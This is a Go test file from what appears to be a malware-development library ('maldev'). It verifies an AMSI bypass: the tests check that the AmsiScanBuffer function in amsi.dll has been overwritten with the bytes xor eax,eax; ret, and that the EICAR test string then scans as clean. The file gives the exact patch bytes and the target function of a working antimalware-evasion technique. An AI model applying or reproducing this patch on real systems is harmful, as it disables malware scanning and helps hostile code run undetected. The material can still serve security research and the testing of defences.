//go:build windows

package amsi

import (
	"testing"
	"unsafe"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/testutil"
	"github.com/oioio-space/maldev/win/api"
)

func TestPatchScanBufferWinAPI(t *testing.T) {
	testutil.RequireIntrusive(t)
	if err := api.Amsi.Load(); err != nil {
		t.Skip("amsi.dll not available")
	}
	proc := api.Amsi.NewProc("AmsiScanBuffer")
	if err := proc.Find(); err != nil {
		t.Skip("AmsiScanBuffer not found")
	}
	addr := proc.Addr()
	err := PatchScanBuffer(nil)
	require.NoError(t, err)
	patched := (*[3]byte)(unsafe.Pointer(addr))
	assert.Equal(t, byte(0x31), patched[0])
	assert.Equal(t, byte(0xC0), patched[1])
	assert.Equal(t, byte(0xC3), patched[2])
}

// TestPatchThenScan verifies AMSI is truly neutralized by calling AmsiScanBuffer
// with the EICAR test string after patching. Without the patch, AMSI would
// return AMSI_RESULT_DETECTED (32768). After patching, the call returns 0
// (S_OK with result=0) because the function body is now xor eax,eax; ret.
func TestPatchThenScan(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)

	if err := api.Amsi.Load(); err != nil {
		t.Skip("amsi.dll not available")
	}

	// Load the procs we need.
	procInit := api.Amsi.NewProc("AmsiInitialize")
	procScan := api.Amsi.NewProc("AmsiScanBuffer")
	if err := procInit.Find(); err != nil {
		t.Skip("AmsiInitialize not found")
	}
	if err := procScan.Find(); err != nil {
		t.Skip("AmsiScanBuffer not found")
	}

	// Initialize AMSI context.
	appName, _ := windows.UTF16PtrFromString("MaldevTest")
	var ctx uintptr
	hr, _, _ := procInit.Call(uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(&ctx)))
	if hr != 0 {
		t.Skipf("AmsiInitialize failed: 0x%X", hr)
	}
	defer func() {
		uninit := api.Amsi.NewProc("AmsiUninitialize")
		if uninit.Find() == nil {
			uninit.Call(ctx)
		}
	}()

	// Patch AMSI.
	require.NoError(t, PatchScanBuffer(nil))

	// Scan the EICAR test string — should be harmless after patch.
	eicar := []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
	var result uint32
	hr, _, _ = procScan.Call(
		ctx,
		uintptr(unsafe.Pointer(&eicar[0])),
		uintptr(len(eicar)),
		0, // contentName
		0, // session
		uintptr(unsafe.Pointer(&result)),
	)
	// After patch, AmsiScanBuffer does xor eax,eax; ret → returns 0 (S_OK).
	// The result variable stays 0 (AMSI_RESULT_CLEAN).
	t.Logf("AmsiScanBuffer returned hr=0x%X result=%d", hr, result)
	assert.Equal(t, uint32(0), result, "AMSI result must be 0 (CLEAN) after patch — EICAR should not be detected")
}
